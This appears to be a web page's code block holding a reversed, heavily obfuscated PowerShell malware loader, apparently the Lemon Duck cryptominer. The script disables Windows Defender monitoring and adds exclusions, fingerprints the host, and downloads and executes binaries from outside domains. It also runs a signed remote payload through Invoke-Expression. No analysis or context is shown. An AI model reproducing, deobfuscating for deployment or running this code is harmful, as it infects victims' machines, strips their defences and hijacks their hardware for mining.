tcejbO-weN;esa&#x27;+&#x27;lfV6C=liaMlacolV6C&#123;yrt</span><br><span class="line"></span><br><span class="line">&#123;)galfmV6qOp+qOpC(fi</span><br><span class="line"></span><br><span class="line">&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">yeksV6C htap-tset=qOp+qOpga&#x27;+&#x27;lfmV6C</span><br><span class="line"></span><br><span class="line">drowqOp+qOpD epyt- 2 drauGledoMtcejbO yeksV6CqOp+qOp yqOp+qOptreporPm&#x27;+&#x27;etI-teS</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">yeksV6C metI-weNqOp+qOp</span><br><span class="line"></span><br><span class="line">&#123;))yeksV6C htaP-tseT(!(fi&#x27;+&#x27;</span><br><span class="line"></span><br><span class="line">7kMytirqOp+qOpuceSd3yko&#x27;+&#x27;oltuOd3y_V6Cd3yhtapV6C::yrtsigeR7kM=yeksV6C    </span><br><span class="line"></span><br><span class="line">&#123;hcaerofQid&#125;)kooltuOd3y_V6Cd3yhtapV6qOp+qOpC::yqOp+qOprtsigeR htaP-tseT( dnaqOp+qOp- 7kM+dd3y7kM hctam- _V6C&#123;tcejbo-erehwQideman- htapV6C::yrtsigeR metidlihc-teg</span><br><span class="line"></span><br><span class="line">&#123;)htap&#x27;+&#x27;V6C::yrqOp+qOptsigqOp+qOpeR htap-tset(fi</span><br><span class="line"></span><br><span class="line">&#123;)shtapV6C ni htapV6C&#x27;+&#x27;(hcaerof</span><br><span class="line"></span><br><span class="line">)7kMosmV6CdnwV6CmrcV6Cd3yosmVqOp+qOp6CskhV6C7kM,7kMosmV6CmrcV6Cd3yosmVqOp+qOp6CskhV6C7kM,7kMosmV6CdnwV6Csk&#x27;+&#x27;hV6C7kM,7kMosmV6CskhV6C7kM(@=shtapV6qOp+qOpC</span><br><span class="line"></span><br><span class="line">7kqOp+qOpMd3yerawtfoSd3yENIHCAMd3&#x27;+&#x27;qOp+qOpy&#x27;+&#x27;YRTSIqOp+qOpGERd3ynuRoTkcilC7kM=mrcV6C</span><br><span class="line"></span><br><span class="line">7kMd3y&#x27;+&#x27;edoN2346woW7kM=dnwV6C</span><br><span class="line"></span><br><span class="line">7kMeciffOd3ytfosorciM7&#x27;+&#x27;kM=osmV6C</span><br><span class="line"></span><br><span class="line">7kMd3yERAWTFOSd3yENIHCAM_LACOL_YEKH7kM=skhV6C&#x27;+&#x27;</span><br><span class="line"></span><br><span class="line">q&#x27;+&#x27;Op+qOp</span><br><span class="line"></span><br><span class="line">&#125;&#123;hctacqOp+qO&#x27;+&#x27;p&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;&#x27;+&#x27;</span><br><span class="line"></span><br><span class="line">dnV6Cd3ypmt:vneV6C metI-evqOp+qOpomeR</span><br><span class="line"></span><br><span class="line">)61,7kM*d3ydnV6Cd3ypmt:vneV6C7kM(er&#x27;+&#x27;eHypoC.)pmt:vneV6C(ecapSemaN.)nqOp+qOpoitacilppA.llehS tcejbOmoC- qOp&#x27;+&#x27;+qOptcejbO-weN(</span><br><span class="line"></span><br><span class="line">)7kMdnV6Cd3ypmt:vqOp+qOpneV6C7kM,7kMdnV6C/7kM+lru_&#x27;+&#x27;nwodV6C(7kMeliqOp+qOpFdaolnwoD7kM.)tneilQUrCbeW.&#x27;+&#x27;tqOp+qOp&#x27;+&#x27;eN tceQUrjbo-wQUren(</span><br><span class="line"></span><br><span class="line">&#123;)86953022 en- htgnelq&#x27;+&#x27;Op+qOp.)gdnV6C metI-teG( ro- qOp+qOp)gdnV6C htap-tsetqOp+qOp(!(fi</span><br><span class="line">&#x27;+&#x27;</span><br><span class="line">7kMtad.gdvnd&#x27;+&#x27;3ypmt:vneV6C7kM=gdnV6C</span><br><span class="line"></span><br><span class="line">7kMpiz.dvn7kM=dnV6CqOp+qOp</span><br><span class="line"></span><br><span class="line">qOp+qOp&#123;)46siV6C &#x27;+&#x27;dna- nsiV6C(fi</span><br><span class="line"></span><br><span class="line">&#123;yrt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7kMpsj.troper/lrqOp+qOpu_erocV6C7kM XEIS</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;&#123;hctac &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;&#x27;+&#x27;</span><br><span class="line"></span><br><span class="line">qOp+qOp)setyb_warV6C]][rahc[nioj-qOp+qOp( XEI</span><br><span class="line"></span><br><span class="line">&#123; ))yarrAety&#x27;+&#x27;bV6C,1ahsV6C,setyb_warV6C(ataDyfirev.asrV6C(fi</span><br><span class="line"></span><br><span class="line">r&#x27;+&#x27;edivorPecivreSotpyrC1qOp+qOpAHS.yhpqOp+qOpargotpyrC.ytiruceS.metsyS&#x27;+&#x27; tcejbO-w&#x27;+&#x27;eN = 1ahsV6C</span><br><span class="line"></span><br><span class="line">)46esabV6C(gnqOp+qOpirtS46esaBmorF::]trevnoc[ = yarrAety&#x27;+&#x27;bV6C</span><br><span class="line"></span><br><span class="line">)setyb_ngisV6C]][rahc[(nioj- = 46esabqOp+qOpV6C</span><br><span class="line"></span><br><span class="line">)smaraPasrV6C(sretemaraPtropmqOp+qOpI.asrVqOp+qOp6C</span><br><span class="line"></span><br><span class="line">;redivorPecivreSotpyrCASR.yhpargotpyqOp+qOprC.ytiruceS.metsyS&#x27;+&#x27; em&#x27;+&#x27;aNqOp+qOpepyT- tcejbO-weN = asrV6C</span><br><span class="line"></span><br><span class="line">10x0,00x0,10x0 q&#x27;+&#x27;Op+qOp= tnenopxE.smaraP&#x27;+&#x27;asrV6CqOp+qOp</span><br><span class="line"></span><br><span class="line">d5x0,b6x0,qOp+qOp74xqOp+qOp0,7bx0,83x0,&#x27;+&#x27;aex0,79x0,eax0,b7x0,4ax0,36x0,88x0,7fx0,5dx0,36x0,dfx0,27x0,01x0,59x0,e2x0,6fx0,f3x&#x27;+&#x27;0,79&#x27;+&#x27;x0,bdx0qOp+qOp,89x0,a0x&#x27;+&#x27;0,bcx0,03x0,e6x0,93x0,fcx0,0dx&#x27;+&#x27;0,24x0&#x27;+&#x27;,e8x0,59x0,eax0,a6x0,19qOp&#x27;+&#x27;+qOpx0,7ax&#x27;+&#x27;0&#x27;+&#x27;,0qOp+qOp4x0,97x0,dcx0,21x0,2e&#x27;+&#x27;x0,fqOp+qOp9x0,7ax0,&#x27;+&#x27;a8x0,87x0,43x&#x27;+&#x27;0,&#x27;+&#x27;7cx0,7ex0,dcx0,10&#x27;+&#x27;x0,25x0,6cx0,37x0,03x0,91x0,1dx0,b2x0,d7x0,b9x0,e2x0,8bx0,c6x0,eex0,29x0,2fx0,53x0,fbx0,88x0,cdx0,06x0,1dx0,11x0,6fx0,fqOp+qOp4x0,&#x27;+&#x27;6ax0,dbx0,edx0,acx0,e6x0,69x0,70x0,68x0,0qOp+qOp7x0,26x0,b3x0,f&#x27;+&#x27;4x0,3fx0,b&#x27;+&#x27;6x0,7&#x27;+&#x27;3x0qOp+qOp,dcx0,dcx0,0cx0,d3x&#x27;+&#x27;0,25x0,c3x0,32x0,e4x0,eax0,6dx0,76x0,bex0,55x0,b7x0,c&#x27;+&#x27;6x0,e6x0,37x0,a9x0,35x0,37x0,ffx0,f2xqOp+qOp0&#x27;+&#x27;,ffx0,28x0,d9x0,99x0,e5x0,14x&#x27;+&#x27;0,d6x0,cbx0,79x0,bbx0,7dx0qOp+qOp,8ax0,56x0,aqOp+qOpdx0 = suludoM.smara&#x27;+&#x27;PasrV6C</span><br><span class="line"></span><br><span class="line">sretemaraPASR.yhpargotpyrC.ytiruceS.met&#x27;+&#x27;syS tcejbO-w&#x27;+&#x27;eN = smaraPasrV6C</span><br><span class="line"></span><br><span class="line">;]tnuoc.setyb&#x27;+&#x27;_serV6C..371[setyb_serV6C = setyb_warVqOp+qOp6C</span><br><span class="line"></span><br><span class="line">;]17&#x27;+&#x27;1..0[setyb_serV6C = s&#x27;+&#x27;etyb_ngisV6C</span><br><span class="line"></span><br><span class="line">qOp+qOp&#123;)371 tg- tnuoc.setyb_serV6C(fi</span><br><span class="line"></span><br><span class="line">)&#x27;+&#x27;lrulanifV6C(ataDdaol&#x27;+&#x27;nwoD.tneilcbewV6C = setyb_serV6C</span><br><span class="line"></span><br><span class="line">&#125;&#123;hctac &#125;</span><br><span class="line"></span><br><span class="line">))6BU-6BU,6BUd3qOp+qOpy6BU(ecalper.kcuD_nomeL&#x27;+&#x27;V6qOp+q&#x27;+&#x27;OpC+7kM-kcuDqOp+qOp-nomeL7kM,7kMtnegA-res&#x27;+&#x27;U7kM(dda.sredaqOp+qOpeH.tnei&#x27;+&#x27;lcbewV6C</span><br><span class="line"></span><br><span class="line">&#123;yrt</span><br><span class="line"></span><br><span class="line">7kMsmarapV6C7kM+7kM?7kM+7kMlruV6C7kM = lrulanifV6C</span><br><span class="line"></span><br><span class="line">tneilQUrCbeW.teN tceQUrjbO-wQUreN = tneilcbewV6C</span><br><span class="line"></span><br><span class="line">&#123;yrt</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">lruV6C]gnirts[</span><br><span class="line"></span><br><span class="line">(maraP</span><br><span class="line"></span><br><span class="line">  &#123; XEIqOp+q&#x27;+&#x27;OpS noitcnuf</span><br><span class="line"></span><br><span class="line">)7kM&amp;7kMnioj-)7kM4.07kM,pmatsemitV6C,emitpuV6C,qOp+qOprhmV6C,pimV6C,vmV6C,)7kM7kMnioj-]5..0[5dmrklV6C(,)7kM7kMnioj-]5..0[5dmmlV6C(,)7kM7kMnioj-]5..0[5dmfilV6C(,&#x27;+&#x27;timrepV6C]tnI[,memV6C,dracV6C,evirdV6C,niamodV6C,resuV6C,46siV6C]tnI[,soV6qOp+qOpC(@(+7kM&amp;7kM=+smarapV6C</span><br><span class="line"></span><br><span class="line">&#125;&#123;hctac&#125;))6BU9.9.9.96BU,6BU8.8.8.86BU(@(redrOhcraeSrevreqOp+qOpSSNDteS.)eurt=&#x27;+&#x27;delbanepi retlif- noitarugifnoc&#x27;+&#x27;retpadakrowten_23niw&#x27;+&#x27; ssalc- tcejboimw-te&#x27;+&#x27;g(&#123;yrt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">))emanerV6C bpg(+)nibrkV6C 5dmrkV6C 4edocV6C fcg(( pts</span><br><span class="line"></span><br><span class="line">&#123;)rKlacolV6C(fi</span><br><span class="line"></span><br><span class="line">4edocV6C xEQUrI</span><br><span class="line"></span><br><span class="line">7kMrK7kM edocg=4edocV6C</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x27;+&#x27;&#125;</span><br><span class="line"></span><br><span class="line">))em&#x27;+&#x27;anerV6C nibgmV6qOp+qOpC apqOp+qOpg(+)nibgmV6C qOp+qOp5dmgmV6C 3edocV6C fcg(( pts</span><br><span class="line"></span><br><span class="line">&#123;qOp+qOp)gnMTlacolV6C(fi</span><br><span class="line"></span><br><span class="line">3edocV6C xEQUrI</span><br><span class="line"></span><br><span class="line">7kMqOp+qOpgnMT7kM&#x27;+&#x27; edocg=3edocV6C</span><br><span class="line"></span><br><span class="line">&#123;)46siV6C dna- )as&#x27;+&#x27;iV6C ro- nsiV6C((fi</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">))emanerV6C nibmV6C apg&#x27;+&#x27;(+)nibmV6C 5dmmV6C 2eqOp+qOpdocV6C fcg(( pts</span><br><span class="line"></span><br><span class="line">&#123;)nMTla&#x27;+&#x27;colV6C(fi</span><br><span class="line"></span><br><span class="line">2edocV6C xEQUrIqOp+qOp</span><br><span class="line"></span><br><span class="line">7kMnMT7kM edocg=2edocV6C</span><br><span class="line"></span><br><span class="line">&#123;)46s&#x27;+&#x27;iV6C(fi</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">))emaqOp+qOpnerV6C bpg(+&#x27;+&#x27;)n&#x27;+&#x27;iqOp+qOpbfiV6C 5dqOp+qOpmfiV6C 1edocV6C fcg(( pts</span><br><span class="line"></span><br><span class="line">&#123;)fIlacolV6C(fi</span><br><span class="line"></span><br><span class="line">1edocV6Cq&#x27;+&#x27;Op+qOp xEQUrI</span><br><span class="line"></span><br><span class="line">7kMfI7kM edocg=1edocV6C</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">6qOp+qOpBU&#125;&#123;hctac&#125;)6BU+lfV6C+6BUlac&#x27;+&#x27;olV6C]fer[,6BU6BU6BU+lfV&#x27;+&#x27;6C+6BUlacoLed3ylabo&#x27;+&#x27;lG6BU6BU,eqOp+qOpurtV6C(xetuM.gnidaerhT tcejbO-weNqOp+qOp;esalfV6C=6BU+lfV6C+6BUlacolV6C&#123;yrt6BU</span><br><span class="line"></span><br><span class="line">qOp+qOp&#123; )&#x27;+&#x27;lfV6C(edocg noitcnuf</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">6BU- 6BU+emanV6C+6BUQid)nocV6C]][rahc[nioj-&#x27;+&#x27;(&#x27;+&#x27;XEQ&#x27;+&#x27;U&#x27;+&#x27;rI6BU &#x27;+&#x27;   </span><br><span class="line"></span><br><span class="line">&#123;)emanV6C(bpg noitcnuf</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">7kMexe&#x27;+&#x27;.manfV6Cd3y%pmt% &amp; exe.manfV6Cd3y%pmtqOp+qOp% iro.manfV6Cd3yqOp+q&#x27;+&#x27;Op%pmt% y/&#x27;+&#x27; &#x27;+&#x27;ypoc c/ dmc&amp; - &#x27;+&#x27;emanV6CQid7qOp+qOp&#x27;+&#x27;kM+)6BU&amp;^^^6BU,&#x27;+&#x27;6BU&amp;6BU(ecalper.)qOp+qOp6BUQiq&#x27;+&#x27;Op+qOpd^^^6BU,6BUQid6BU(ecalpeqOp+qO&#x27;+&#x27;pr.)6BUnibV6C setyBEP- 1tset;))001 tqOp+qOpnuoC- modnaR-teGQid)721..&#x27;+&#x27;1((+_&#x27;+&#x27;nibV6C,pemV6C(setyBllA&#x27;+&#x27;etirW::]eliF.OI.metqOp+qOpsySqOp+qOp[;6BU6BU6BU+7kMiro.manfV6Cd3y7kM+6BU6BU6BU+pmt:vneV6C=pemV6C;)(enolC.nibV6C=_nibVqOp+qOp6C;)0000&#x27;+&#x27;0001(setyBdaeRqOp+qOp.)))sseqOp+qOprpmoceD::]edoMnoisserpmoC.no&#x27;+&#x27;qOp+qOpisserpmoC.OI[( ,))])tnuoc.nocV6C(..)1+iV6C([nocV6CqOp+qOp,(maer&#x27;+&#x27;tSyrom&#x27;+&#x27;eM.OI.metsyS tcejbO-weN( maertSpi&#x27;+&#x27;zG.noisserpmoC.OI.me&#x27;+&#x27;tsyS tcejbqOp+qOpO-weN(redaeRyraqOp+qOpniB.OI tcejbO-weN(=nibV6C;)]iV6C..0qOp+qOp[nocV6C]qO&#x27;+&#x27;p+qOp][rahc[nioj-(xeQUri;&#125;&#125;kaerb&#123;)a0x0 qe- ]iV6C[nocV6C(fi&#123;)1=+iV6C;1-tnuoc.nocV6C tl- iV6C;0=iV6C(rofqOp+q&#x27;+&#x27;Op6BU(</span><br><span class="line"></span><br><span class="line">&#123;)emanV6C,manfV6C(apg &#x27;+&#x27;noitcnuf</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">)&#x27;+&#x27;6BU&amp;^^^6BU,6BU&amp;6BU(ecalper.)6BUQid^&#x27;+&#x27;^^6qOp+qOpBU,&#x27;+&#x27;6BUQid6B&#x27;+&#x27;qOp+qOpU(ecalper.)6BU&#125;_5dm&#x27;+&#x27;V6C=5dmfiV6C;&#x27;+&#x27;_nocV6CqOp+qOp=nocV6C&#x27;+&#x27;&#123;)puonV6C(fi&#125;&#125;1=puonV6C&#123;esle&#125;)nocV6C,pfiV6C(setyBllAetirW::]eliF.OI.metsyS[&#123;)5dmfiV6Cqe-tV6C(fi;no&#x27;+&#x27;cV6C 5dmg=tV6C;)6BU6BU6BU+&#x27;+&#x27;smarapV&#x27;+&#x27;6C+6BU?6BU+nfV6&#x27;+&#x27;C+6BU/6BU6BU+lru_nwodV6qOp+qOpC(aqOp+qOptaddaolnwod.)tneilQUrCbeW.teN&#x27;+&#x27; tceQUrjbO-wQUreN(=nocV6C&#x27;+&#x27;&#123;)puonV6C!(fi&#125;&#125;1=puonV6C&#123;)5dmfiV6Cqe-_5dmV6C(fi;_nocV6CqOp+qOp 5dmg=_5dmV6C;)pfiV6C(&#x27;+&#x27;setyBllAdaeR::]eliF.OI.metsyqOp+qOpS[=_nocV6C&#123;)pf&#x27;+&#x27;iV6C htap-tset(fi&#125;sV6C nruter;&#125;)6BU6BU2x6BU6B&#x27;+&#x27;U(gnirtSoT._V6C=+sV6C&#123;hcaerofQidqOp&#x27;+&#x27;+qOp)nocV6C(hsaHetupmoC.)(etaerC::]5DM.yhpargotpyrC.ytiruceS.metsyS[&#123;)nocV6C(5dqOp+qOpmg noitcnuf;6BU6BU6BU+lru_nwodV6C+6BU6BU6BU=l&#x27;+&#x27;ru_nwodV6C;6BU6BU6BU+nfqOp+qOpV&#x27;+&#x27;6C+6BUd3y6BU6BU+pm&#x27;+&#x27;t:vneV&#x27;+&#x27;6C=pfiV6C;6BU6BU6BU&#x27;+&#x27;+dmV6C+6BU6BqOp+qOpU6BUqOp+qOp=5dmfiV6C;6BU+edocV6C+6BU ohce6BU(</span><br><span class="line"></span><br><span class="line">&#123;)nfV6C,dmV6C,edocV6C(fcg noitcnuf</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">7kMargV6C c/7kM tsiLtneqOp+qOpmugrA- exe.dmc htaPeliF- sseqOp+qOpcorP-&#x27;+&#x27;tqOp+qOpr&#x27;+&#x27;atS</span><br><span class="line"></span><br><span class="line">argV6C tsoh-etirw    </span><br><span class="line"></span><br><span class="line">&#123;)argV6C(pt&#x27;+&#x27;s noitcnuf</span><br><span class="line"></span><br><span class="line">pmt:vneV&#x27;+&#x27;6C noitacol-tes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7kqOp+qOpM&amp;7kMnioj-)camV6C,diqOp+qOpugV6C,e&#x27;+&#x27;man_pmocV6C,vV6C(@=sma&#x27;+&#x27;rapV6C</span><br><span class="line"></span><br><span class="line">]1[)7kM?7kM(tilps.lruV6C=vV6C</span><br><span class="line"></span><br><span class="line">&#125;1=asiV6C&#123;))7kMDMAQqOp+qOpidnoedaR7kM hctam- dracV6C((fi</span><br><span class="line"></span><br><span class="line">&#125;1=nsiV6C&#123;))7kMECROFEGQidAIDIVNQidXTG7kM hctam- dracV6C((fi</span><br><span class="line"></span><br><span class="line">&#125;&#123;hqOp+qOpctac&#125;</span><br><span class="line"></span><br><span class="line">emaneqOp+qOprV6Cd3y0.1vd3yqOp+qOpllehSrewoPswodniWd3y23met&#x27;+&#x27;sysd3yswodniwd3y:c ssecorPnoisu&#x27;+&#x27;lcxE- e&#x27;+&#x27;qOp+qOp&#x27;+&#x27;cnereferPpM-qOp+qOpddA    </span><br><span class="line"></span><br><span class="line">ex&#x27;+&#x27;e.llehsrewopd3y0.1&#x27;+&#x27;vd3yllehSrewoPqOp+qOpswodniWdqOp+qOp3y23metsysd3yqOp+qOpswodniwd3y:c ssecorPnoisulcxE- ecnereferPpM-ddA</span><br><span class="line"></span><br><span class="line">d3y:c htaPnoisulcxE- ecnereferPpM-ddA</span><br><span class="line"></span><br><span class="line">1 gnirotinoMemitlaeRel&#x27;+&#x27;basiD- ecnereferPpM-teS</span><br><span class="line"></span><br><span class="line">&#123;qOp+qOpyrt</span><br><span class="line"></span><br><span class="line">&#125;&#123;hctac&#125;)6BU,6BU(nqOp+qOpioj-latot.etarhsah.jboV6C=rhmV6C</span><br><span class="line"></span><br><span class="line">pi.noitcennoc.jboV6C=pimV6C</span><br><span class="line"></span><br><span class="line">noisrev.jboV6C=vmV6C</span><br><span class="line"></span><br><span class="line">qOp+qOp))6BUyrammus/qOp+qOp1/96634:1.0.&#x27;+&#x27;0.721//:ptth6BU(7kMgnirtsdaolnwqOp+qOpod7kM.&#x27;+&#x27;)tneilQUrcbew.ten tceQUrjbo-wQUrenqOp+&#x27;+&#x27;qOp((tcejbOezilaireseD.)rezilaireStpircqOp+qOpSavaJ.noitaqOp+qOpzilaireS.tqOp+qOppircS.beW tcejbO-weN( = &#x27;+&#x27;jboV6C</span><br><span class="line"></span><br><span class="line">)7kMsqOp+qOpnoisnetxE.beW.metsyS7kM(emaNlaitraPhtiqOp+qOpWdaoL::]ylbmessA.noitcelfeR[</span><br><span class="line"></span><br><span class="line">&#123;yrt</span><br><span class="line"></span><br><span class="line">)9,0(gnirtsbuS.)7kMs%7kM tam&#x27;+&#x27;roFU- etaD-teG( = pmatsemitV6C</span><br><span class="line"></span><br><span class="line">&#125;&#123;hctac&#125;7kMQid7kMnioj-)&#125;]0[))(gnqOp+qOpirtsot.epyTevirD._V6C(+7kM_7kM+]0[qOp+qOp)emaN._V6C(&#123;hca&#x27;+&#x27;erof Qid &#125;))7kM23TAF7kM qe- tamroFevirD._V6C( ro- )7kMSFTN7kM qe&#x27;+&#x27;- tamroFevirD._V6C(( dna- ))7kMkrowteN7kM qe&#x27;+&#x27;- epyTevirD._V6C( ro- )7kMelbavom&#x27;+&#x27;eR7kM qe- epyTevirD._&#x27;+&#x27;V6C(( dna- )4201 tg- ecapSeerFelbaliavA._V6C( dqOp+qOpna- ydae&#x27;+&#x27;RsI._V6C&#123; erehw Qid )(sevirDteG::]ofnIevirD.OI.metsys[( = evirdV6C</span><br><span class="line"></span><br><span class="line">&#123;yrt</span><br><span class="line"></span><br><span class="line">bG1/musmV6qOp+&#x27;+&#x27;qO&#x27;+&#x27;pC=memV6C;&#125; yticapaC&#x27;+&#x27;._V6C =+ m&#x27;+&#x27;usmV6C &#123; &#125;0 = musmVqOp+qOp6C&#123;% Qid yromeMlacisyhP_23niW imwg</span><br><span class="line"></span><br><span class="line">eman&#x27;+&#x27;.)rellortnoCoediV_23&#x27;+&#x27;niW tcejbOimW-teG( = dracV6C</span><br><span class="line"></span><br><span class="line">&#125;sdnoceslaqO&#x27;+&#x27;p+qOptot._V6C&#123;hcaerofQid)tnuoCkciT::]tnemnorivne[(sdnqOp+qOpocesilliMmorF::]napsemit[&#x27;+&#x27; = emitpuV6C</span><br><span class="line"></span><br><span class="line">niamoD.)metsysre&#x27;+&#x27;tupmoc_23niw tceqOp+qOpjbOimW-teG( = niamodV6qO&#x27;+&#x27;p+qOpC</span><br><span class="line"></span><br><span class="line">EMANRESU:vneV6C = resuV6&#x27;+&#x27;qOp+qOpC</span><br><span class="line"></span><br><span class="line">noisreV.bsoV6C+qOp+qOp7kM_7kM+)7kM7kM,7kM swodniW tfosorcqOp&#x27;+&#x27;+qOpiM7kM(ecalper.noitpaC.bsoV6C = soV&#x27;+&#x27;6C</span><br><span class="line"></span><br><span class="line">)metsySgnitarepO_&#x27;+&#x27;23niW ssaqOp+qOplc- tcejbOimW-teG( = bsoV6C</span><br><span class="line">&#x27;+&#x27;</span><br><span class="line">1 tsrif&#x27;+&#x27;- tcejbo-tceles Qid sserddacaM.)&#125;eurtV6C QE- delbanepi._V6C&#123; erehw QiqOp+qOpd noitarugifnoCretpadAkrowteN_23niW&#x27;+&#x27; tcejbOimW-teG( = camV6C</span><br><span class="line"></span><br><span class="line">DIUU.)tcudorPmetsySretupmqOp+qOpoC_2qOp+qOp3niW tcejboimw-teg( =qOp+qOp diugV6C&#x27;+&#x27;</span><br><span class="line"></span><br><span class="line">EMANRETUPMOC:vneV6C = eman_pmocV6C</span><br><span class="line"></span><br><span class="line">)7kMrotartsinimdA7kM ]eloRnItliuBswodniW.lqOp+qOpapqOp&#x27;+&#x27;+qOpicnirP.yt&#x27;+&#x27;iruceS[(eloRnIsI.))(tnerruCteG:&#x27;+&#x27;:]ytitnedIswodniW.lapicnirP.ytiruceS[]lapicnirPswo&#x27;+&#x27;dniW.lapicnirP.ytiruceS[( = timrepV6C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7kM/7kMnioj-]2..0[)7kM/7kM(tilps.lruV6C = lru_erocV6&#x27;+&#x27;C</span><br><span class="line"></span><br><span class="line">&#125;7kMmoc.xnyma.t//:ptth7kMq&#x27;+&#x27;Op+qOp=lrqOp+qOpuV6C&#123;)lru&#x27;+&#x27;V6C!(fi</span><br><span class="line"></span><br><span class="line">qOp+qOp7kMmoc.gnkca.d//:ptth7kM =qOp+qOp lru_nwodV6C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;&#123;hctac&#125;))7kMnibrkV6Cd3ypmt:vneV&#x27;+&#x27;6CqOp+qOp7kM(sqOp+qOpetyBllAdaeR::]eliF.OI[( 5dmg=5dmrklV6C&#123;yrt</span><br><span class="line"></span><br><span class="line">&#125;&#123;hctac&#125;))7kMnibmV6Cd3ypmt:vne&#x27;+&#x27;V6C7qOp+qOpkM(setyBllAdaeR::]eliF.OI[( 5dmg=5dmmlV6C&#123;yrt</span><br><span class="line"></span><br><span class="line">&#125;&#123;hctacqOp+qOp&#125;))7kMnibfiV6Cd3ypmt:vneV6C7kM(setyBllAdaeR::]eliF.OI[( 5&#x27;+&#x27;dmg=5dmfilVqOp+qOp6C&#123;yrtqOp+qOp</span><br><span class="line"></span><br><span class="line">7kM7kM,7kM7kM,7kM7kM=5dm&#x27;+&#x27;rklV6C,5dmmlV6C,5dmfilV6C</span><br><span class="line"></span><br><span class="line">emanrteg=emanerV6C</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">emaqOp+qOpneV6C&#x27;+&#x27; nrqOp+qOputeqOp+qOpr    </span><br><span class="line"></span><br><span class="line">&#125;7kMexe.llehsrewop7kM=emaneV6C&#123;))7k&#x27;+&#x27;M&#x27;+&#x27;emanqOp+qOpeV6Cd3yhtaprV6C7k&#x27;+&#x27;qOp+qOpM htap-tset(!(fi    </span><br><span class="line"></span><br><span class="line">llun-tuoQid7kM&#x27;+&#x27;emaneV6Cd3yhtapr&#x27;+&#x27;V6C7kM 7kMexe.llehsrewopd3yhtaprV6C7kM meti-ypoc    </span><br><span class="line"></span><br><span class="line">7kMexe.7k&#x27;+&#x27;M + ))&#x27;+&#x27;6%)modnaR-teG(+6( tnuoC- modnaR-t&#x27;+&#x27;eGQid)221..79+09..56+75..84(]][rahc[(nioj-=emaneV6C    </span><br><span class="line"></span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">&#125;  qOp+qOp      </span><br><span class="line"></span><br><span class="line">emaneV6C nruter            </span><br><span class="line"></span><br><span class="line">&#123;)_5dmV6C qe- 5dmtV6CqOp+qOp(fiqOp+qOp        &#x27;+&#x27;</span><br><span class="line"></span><br><span class="line">))7kMemaneV6Cd3yht&#x27;+&#x27;apqOp+q&#x27;+&#x27;OprV6C7kM(seqOp+qOptyBllAdaeR::]eliF&#x27;+&#x27;.OI[( qOp+qOp5dmg=_5dmV6&#x27;+&#x27;C        </span><br><span class="line"></span><br><span class="line">&#123;)semaneV6C ni emaneV6C(hcaerof    </span><br><span class="line"></span><br><span class="line">))7kMexe.lleh&#x27;+&#x27;srewopd3yhtaprV&#x27;+&#x27;6C7kM(setyBllAqOp+qOpdaeR::]eliF.OI[( 5dmg = 5dmtVqOp+qOp6C    </span><br><span class="line"></span><br><span class="line">&#125;eman._V6C&#123;qOp+qOphqOp+qOpcaerofQidexe.llehsreqOp+qOpw&#x27;+&#x27;op edulcxE- exe.&#x27;+&#x27;* edulcnI- 7&#x27;+&#x27;kM*d3yhtaprV6C7kM icg = semaneV6C&#x27;+&#x27;    </span><br><span class="line"></span><br><span class="line">7kM0.1Vd3ylqOp+qOplehsrewopswodniWd3y23metsySqOp+qOpd3yswodniWd3y:C7kM=htapr&#x27;+&#x27;V6C    </span><br><span class="line"></span><br><span class="line">&#123;)(emanrteg noitcnuf</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lV6C nruter</span><br><span class="line"></span><br><span class="line">&#125;)6BU2x6BU(gnirtS&#x27;+&#x27;oT._V6C=+lV6C&#123;hcaerofQid)dV6C(hsaHqOp+qOpetupmoC.)(etaerC::]5DM.yhpargotpyrC.ytiruceS[</span><br><span class="line"></span><br><span class="line">&#123;)dV6C(5dmqOp+qOpg noitcnuf</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">7kM2962557a5&#x27;+&#x27;e041f580qOp+qOp67f1fabffb2428c7kM=5dmgmV6C&#x27;+&#x27;</span><br><span class="line"></span><br><span class="line">7kMnib.g6m7kM=nibgmV6C</span><br><span class="line"></span><br><span class="line">7&#x27;+&#x27;kM53&#x27;+&#x27;9e05e7d&#x27;+&#x27;dce36e1e6c7e90qOp+qOp5d4419dcd7kM=5dmqOp+qOpmV6C</span><br><span class="line"></span><br><span class="line">7kMnib.6m7kM=nibmV6C</span><br><span class="line"></span><br><span class="line">&#123;)46siV6C(fi</span><br><span class="line"></span><br><span class="line">7kM30b4cf48d35c1d78qOp+qOpd2&#x27;+&#x27;6389ba7ceca40e7kM=5dmrkV6C</span><br><span class="line"></span><br><span class="line">7kMni&#x27;+&#x27;b.rk7kM=nibrkV6C</span><br><span class="line"></span><br><span class="line">7kM8511d8qOp+qOpf8e1f01c0330e8&#x27;+&#x27;0b5df37b6a587kM=5dmfiV6C</span><br><span class="line"></span><br><span 